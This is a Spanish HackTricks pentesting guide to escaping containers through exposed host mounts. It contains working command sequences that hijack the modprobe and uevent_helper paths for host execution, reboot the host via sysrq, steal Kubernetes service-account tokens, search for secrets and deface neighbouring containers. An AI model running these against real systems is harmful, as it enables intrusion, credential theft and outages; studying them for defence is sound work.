# Montajes sensibles del host

{{#include ../../../banners/hacktricks-training.md}}

## Visión general

Los montajes del host son una de las superficies prácticas más importantes para escapar de contenedores porque a menudo colapsan una vista de procesos cuidadosamente aislada, devolviéndola a la visibilidad directa de los recursos del host. Los casos peligrosos no se limitan a `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths pueden exponer controles del kernel, credenciales, sistemas de archivos de contenedores vecinos e interfaces de gestión en tiempo de ejecución.

Esta página existe por separado de las páginas de protección individuales porque el modelo de abuso es transversal. Un writable host mount es peligroso en parte por los mount namespaces, en parte por los user namespaces, en parte por la cobertura de AppArmor o SELinux, y en parte por qué ruta del host exacta fue expuesta. Tratarlo como su propio tema facilita razonar sobre la superficie de ataque.

## `/proc` Exposure

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas de proc inesperadamente escribibles puede, por tanto, conducir a divulgación de información, denegación de servicio o ejecución directa de código en el host.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comience por comprobar qué entradas de procfs de alto valor son visibles o escribibles:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Estas rutas son interesantes por distintas razones. `core_pattern`, `modprobe` y `binfmt_misc` pueden convertirse en rutas de ejecución de código en el host si son escribibles. `kallsyms`, `kmsg`, `kcore` y `config.gz` son fuentes poderosas de reconocimiento para la explotación del kernel. `sched_debug` y `mountinfo` revelan contexto de procesos, cgroup y sistema de archivos que pueden ayudar a reconstruir la disposición del host desde dentro del contenedor.

El valor práctico de cada ruta es distinto; tratarlas a todas como si tuvieran el mismo impacto dificulta el triage:

- `/proc/sys/kernel/core_pattern`
  Si es escribible, esta es una de las rutas de procfs con mayor impacto porque el kernel ejecutará un pipe handler tras un crash. Un contenedor que pueda apuntar `core_pattern` a un payload almacenado en su overlay o en una ruta montada del host a menudo puede obtener ejecución de código en el host. Véase también [read-only-paths.md](protections/read-only-paths.md) para un ejemplo dedicado.
- `/proc/sys/kernel/modprobe`
  Esta ruta controla el helper de userspace que usa el kernel cuando necesita invocar la lógica de carga de módulos. Si es escribible desde el contenedor e interpretada en el contexto del host, puede convertirse en otra primitiva de ejecución de código en el host. Es especialmente interesante cuando se combina con una forma de disparar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
  Normalmente no es una primitiva de escape limpia, pero puede convertir la presión de memoria en un denial-of-service a nivel de host al transformar condiciones OOM en comportamiento de panic del kernel.
- `/proc/sys/fs/binfmt_misc`
  Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor magic elegido y obtener ejecución en contexto de host cuando se ejecute un archivo que coincida.
- `/proc/config.gz`
  Útil para el triage de exploits de kernel. Ayuda a determinar qué subsistemas, mitigaciones y características opcionales del kernel están habilitadas sin necesitar metadata de paquetes del host.
- `/proc/sysrq-trigger`
  Mayormente una ruta de denial-of-service, pero muy seria. Puede reiniciar, provocar un panic, o de otro modo interrumpir el host de inmediato.
- `/proc/kmsg`
  Revela mensajes del kernel ring buffer. Útil para fingerprinting del host, análisis de crashes, y en algunos entornos para leaking información útil para la explotación del kernel.
- `/proc/kallsyms`
  Valioso cuando es legible porque expone información de símbolos del kernel exportados y puede ayudar a derrotar las suposiciones de aleatorización de direcciones durante el desarrollo de exploits de kernel.
- `/proc/[pid]/mem`
  Esta es una interfaz directa a la memoria de procesos. Si el proceso objetivo es accesible con las condiciones necesarias al estilo ptrace, puede permitir leer o modificar la memoria de otro proceso. El impacto realista depende en gran medida de credenciales, `hidepid`, Yama y las restricciones de ptrace, por lo que es una ruta potente pero condicional.
- `/proc/kcore`
  Expone una vista del estilo core-image de la memoria del sistema. El archivo es enorme y difícil de usar, pero si es legiblemente accesible indica una superficie de memoria del host mal expuesta.
- `/proc/kmem` and `/proc/mem`
  Históricamente interfaces de memoria cruda de alto impacto. En muchos sistemas modernos están deshabilitadas o fuertemente restringidas, pero si están presentes y son utilizables deben tratarse como hallazgos críticos.
- `/proc/sched_debug`
  Revela información de planificación y tareas que puede exponer identidades de procesos del host incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
  Extremadamente útil para reconstruir dónde está realmente ubicado el contenedor en el host, qué rutas están respaldadas por overlay y si un montaje escribible corresponde a contenido del host o solo a la capa del contenedor.

Si `/proc/[pid]/mountinfo` o los detalles del overlay son legibles, úsalos para recuperar la ruta del host del sistema de archivos del contenedor:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varios trucos de ejecución en el host requieren convertir una ruta dentro del contenedor en la ruta correspondiente desde el punto de vista del host.

### Ejemplo completo: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` es escribible desde el contenedor y el helper path se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El desencadenante exacto depende del objetivo y del comportamiento del kernel, pero lo importante es que una ruta auxiliar con permisos de escritura puede redirigir una futura invocación del helper del kernel hacia contenido en la ruta del host controlada por el atacante.

### Ejemplo completo: Kernel Recon con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar la explotabilidad en lugar de un escape inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a responder si información útil de símbolos es visible, si mensajes recientes del kernel revelan un estado interesante, y qué funciones o mitigaciones del kernel están compiladas. El impacto normalmente no es un escape directo, pero puede acortar drásticamente el triage de vulnerabilidades del kernel.

### Ejemplo completo: Reinicio del host con SysRq

Si `/proc/sysrq-trigger` es escribible y es visible desde la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es un reinicio inmediato del host. No es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que la divulgación de información.

## Exposición de `/sys`

sysfs expone grandes cantidades de estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar la ejecución de helpers, el comportamiento de dispositivos, la configuración de módulos de seguridad o el estado del firmware.

Rutas de sysfs de alto valor incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas importan por razones distintas. `/sys/class/thermal` puede influir en el comportamiento de gestión térmica y, por tanto, en la estabilidad del host en entornos mal expuestos. `/sys/kernel/vmcoreinfo` puede leak información de crash-dump y kernel-layout que ayuda con el fingerprinting del host a bajo nivel. `/sys/kernel/security` es la interfaz `securityfs` usada por Linux Security Modules, por lo que un acceso inesperado allí puede exponer o alterar MAC-related state. Las rutas de variables EFI pueden afectar ajustes de arranque respaldados por firmware, haciéndolas mucho más serias que archivos de configuración ordinarios. `debugfs` bajo `/sys/kernel/debug` es especialmente peligroso porque es intencionalmente una interfaz orientada a desarrolladores con expectativas de seguridad mucho menores que las APIs del kernel destinadas a producción y endurecidas.

Comandos útiles para revisar estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Qué hace que esos comandos sean interesantes:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y es legible o escribible, espere una amplia superficie orientada al kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- La exposición de variables EFI es menos común, pero si está presente tiene alto impacto porque afecta a configuraciones respaldadas por firmware en lugar de archivos de tiempo de ejecución ordinarios.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host e interacción con el hardware, no para un elegante shell-style escape.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente para identificación del host y análisis de fallos, útil para entender el estado del kernel a bajo nivel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede ejecutar un helper controlado por el atacante cuando se desencadena un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de dentro del container actual.

## `/var` Exposure

Montar el `/var` del host en un container suele subestimarse porque no parece tan dramático como montar `/`. En la práctica puede ser suficiente para alcanzar sockets en tiempo de ejecución, directorios de snapshot de containers, volúmenes de pods gestionados por kubelet, projected service-account tokens y sistemas de archivos de aplicaciones vecinas. En nodos modernos, `/var` suele ser donde reside el estado de container más interesante desde el punto de vista operativo.

### Kubernetes Example

Un pod con `hostPath: /var` a menudo puede leer los projected tokens de otros pods y el contenido de overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque responden si el montaje expone solo datos de aplicaciones poco relevantes o credenciales del clúster de alto impacto. Un service-account token legible puede convertir inmediatamente local code execution en acceso a Kubernetes API.

Si el service-account token está presente, valida a qué puede acceder en lugar de detenerte en el descubrimiento del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso a un nodo local. Un token con RBAC amplio puede convertir un `/var` montado en una compromisión a nivel de clúster.

### Ejemplo de Docker y containerd

En hosts Docker, los datos relevantes suelen estar bajo `/var/lib/docker`, mientras que en nodos Kubernetes con containerd pueden estar bajo `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenidos de snapshot escribibles de otra carga de trabajo, el atacante podría alterar archivos de la aplicación, plantar contenido web o cambiar scripts de inicio sin tocar la configuración actual del container.

Ideas concretas de abuso una vez que se encuentra contenido de snapshot escribible:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto de `/var` montado: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia cargas de trabajo vecinas.

## Sockets de tiempo de ejecución

Los montajes sensibles del host a menudo incluyen sockets de tiempo de ejecución en lugar de directorios completos. Estos son tan importantes que merecen una repetición explícita aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para los flujos completos de explotación una vez que uno de estos sockets esté montado.

Como un patrón de interacción inicial rápido:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, la ruta desde "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corta que cualquier ruta de kernel breakout.

## CVEs relacionadas con mounts

Los mounts del host también se solapan con vulnerabilidades en tiempo de ejecución. Ejemplos recientes importantes incluyen:

- `CVE-2024-21626` en `runc`, donde un leaked descriptor de fichero de directorio podría colocar el directorio de trabajo en el sistema de archivos del host.
- `CVE-2024-23651` y `CVE-2024-23653` en BuildKit, donde las carreras de copy-up de OverlayFS podrían producir escrituras en rutas del host durante los builds.
- `CVE-2024-1753` en Buildah y los flujos de build de Podman, donde bind mounts manipulados durante el build podrían exponer `/` en lectura-escritura.
- `CVE-2024-40635` en containerd, donde un valor grande de `User` podría desbordarse hacia un comportamiento de UID 0.

Estos CVEs importan aquí porque demuestran que el manejo de mounts no se limita a la configuración del operador. El runtime en sí mismo también puede introducir condiciones de escape impulsadas por mounts.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de mounts de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- El root del host, `/proc`, `/sys`, `/var` y los sockets en tiempo de ejecución son hallazgos de alta prioridad.
- Las entradas escribibles de proc/sys suelen indicar que el montaje está exponiendo controles del kernel globales del host en lugar de una vista segura del contenedor.
- Las rutas montadas en `/var` merecen revisión de credenciales y de cargas de trabajo vecinas, no solo una revisión del sistema de archivos.
